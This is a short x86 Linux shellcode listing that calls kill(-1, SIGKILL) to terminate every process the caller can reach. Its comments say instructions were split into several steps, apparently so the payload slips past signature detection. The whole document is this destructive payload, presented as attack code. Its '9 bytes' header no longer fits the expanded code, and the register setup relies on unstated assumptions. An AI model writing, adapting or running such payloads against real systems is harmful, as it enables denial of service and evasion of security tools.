; linux/x86 kill all processes 9 bytes
; root@thegibson
; 2010-01-14

section .text

global _start

_start:
        ; kill(-1, SIGKILL);
	; broke mov al, 37 into 3 instructions
	mov cl, 0x24
	mov eax, ecx
	add eax, 0x1

        push byte -1
        pop ebx

	; broke mov cl, 9 into 3 instructions
	mov dl, 0x8
	mov ecx, edx
	add ecx, 0x1

        int 0x80
